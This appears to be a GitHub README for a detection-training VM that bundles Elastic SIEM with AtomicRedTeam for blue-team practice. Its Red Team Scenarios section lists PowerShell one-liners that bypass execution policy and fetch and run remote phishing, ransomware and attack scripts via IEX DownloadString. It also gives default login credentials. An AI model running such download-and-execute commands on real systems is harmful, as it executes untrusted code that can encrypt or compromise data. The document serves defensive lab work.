<picture>
  <source srcset="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/elasticsearch-logo.png" media="(prefers-color-scheme:dark)" width=75% height=75%>
  <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/elastic-logo.png" width=75% height=75%>
</picture>
  

# Elastic_Lab VM

Enchance your analysis, detection and threat hunting skills in an Elastic focused enviroment. A windows 10 based VM backed with ElasticSearch, Kibana and Loaded with AtomicRedTeam as well as custom red team scenario scripts.

 1. [Test, Detect, Understand](#test-detect-and-understand)
 2. [Download](#download)
 3. [Installation](#installation)
 4. [Remeber](#remember)
 5. [Red Team Scenarios](#red-team-scenarios)
 6. [Intergrations](intergrations)
 7. [Data Streams](data-streams)
 8. [VM Credentials](vm-credentials)
 9. [VM Minimum Requiments](vm-minimum-requiments)
 10. [VM Specs](vm-specs)

---

## Test, Detect and Understand

### Test
  
Test your team on there Blue team skills, Running AtomicRedTeam scripts against the enviroment or even try hack the VM within your own network.

### Detect
  
Utalising Elastic SIEM and Endpoint Secuirty to Detect as many TTPs by creating your own custom rule set or implement Elastics own rule set.

### Understand
  
With the Elastic agent ingesting Sysmon, Powershell, wineventlogs, Endpoint Monitoring and Network traffic logs, deep dive and conduct full analysis recognising any IOCs.  
   
## Download 

|[Elastic Lab.zip](https://github.com/)|
|---|

| File | Algo | Hash |
| ---- | ---- | ---- |
| Elastic_lab.7z | SHA256 | 5527DCED40257A7C48C4310584B0BBBC5170F6C45949C9464347254AA59B9B14 |
| Elastic_Lab.ovf | SHA256 | FD9789EEFE05963297369EE9524A423C7BC76E65FD271D41227BFFA4DDCEDE63 |


## Installation 
  
  1. Unzip Elastic_Lab.zip
  2. Open VMWare
  3. Select `Open A Virtual Machine`
  4. Select `Elastic_Lab.ovf`
  5. Insert name of new virtual machine i.e `Elastic_Lab`
  6. Select storage path for the virtual machine
  7. Select `Import`
  8. Importing the VM can take some time
  9. Right click on your new VM
  10. Take Snapshot prior to starting machine

<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/snapshot.png" width=50% height=50%>  
  
## Remember

:warning: Elastic Services can take up to 5 minutes to load.  
  
:warning: Microsoft defender is deactivated and Elastic Agent acts as the primary AV, detecting threats not preventing them.  
  
:warning: Ensure you create a snapshot prior to starting the machine for the first time, allowing you to revert to a clean image prior to further red team engagments.

:warning: On start up the Elastic Agent and Fleet Server need to align, sometimes it may require a manual restart.  
  
Open Kibana and search for fleet managment.  

<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server1.png" width=50% height=50%>  

if it shows that the agent is offline / unhealhy you will need to restart the agent by running the `Restart_Elastic_Agent.bat` as administrator.  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/fleet_server2.png" width=75% height=75%>  
  
   
## Red Team Scenarios
  
Open Powershell as `Administrator` and execute the code below. 
This will generate logs and alerts within Kibana. 
Depening on the scenario the powershell scripts can take from 5 - 30 minutes to execute.  
When you what to reset the VM or clean up after the attack just select the restart snapshot.

#### Phishing ####

```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Phish.ps1')"
```
  
#### Ransomware ####

```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/Ransom.ps1')"
```
  
#### Execute all atomic red team scripts ####
  
```
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Scripts/AtomicRedTeam_All.ps1')"
```  
-------------------  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/Elastic_homescreen.png" width=75% height=75%>  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/discover.png" width=75% height=75%>  
  
<img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/security.png" width=75% height=75%>  
  
-------------------  

## Intergrations
<details>
  <summary>Elastic Agent intergrations</summary>
  <img src="https://github.com/H0wl3r/Elastic_Lab/blob/main/Pictures/intergrations.png" width=50% height=50%> 
  
</details>


## Data Streams

<details>
  <summary>Elastic Agent</summary>
  
  -------------------  
  
  * elastic_agent
  * elastic_agent.endpoint_security
  * elastic_agent.filebeat
  * elastic_agent.fleet_server
  * elastic_agent.metricbeat
  * elastic_agent.packetbeat
  
  -------------------  
  
  
</details>

<details>
  <summary>Endpoint Security</summary>
  
  -------------------  
  
  * endpoint.events.file
  * endpoint.events.security
  * endpoint.events.network
  * endpoint.events.registry
  
  -------------------  
  
  
</details>

<details>
  <summary>Network Traffic</summary>
  
  -------------------  
  
  * network_traffic.dhcpv4
  * network_traffic.dns
  * network_traffic.flow
  * network_traffic.http
  * network_traffic.icmp
  * network_traffic.tls
  
  -------------------  
  
</details>

<details>
  <summary>System / Sysmon  </summary>
  
  -------------------  
  
  Sysmon Configuration  
  [olafhartong Sysmon config](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)  
  
  -------------------  
  
  * system.application
  * system.security
  * system.system
  * windows.sysmon_operational  
  
  -------------------  
  
  
</details>

<details>
  <summary>Threat Intel</summary>  
  
  -------------------  
  
  * ti_abusech.malware
  * ti_abusech.malwarebazaar
  * ti_abusech.url
  
  -------------------  
  
</details>

## VM Credentials

**Windows 10 Login**  
> **User:**     Elastic    
> **pass:**     elastic  

**Elastic login**   
> **User:**   elastic  
> **pass:**   elastic  


## VM Minimum Requiments

* 4 GB RAM
* 2 CPU
* 60GB Storage

## VM Specs

* Windows 10 (unlicensed)
* Elastic Agent 8.6.1
* ElasticSearch 8.6.1
* Kibana 8.6.1
* AtomicRedTeam










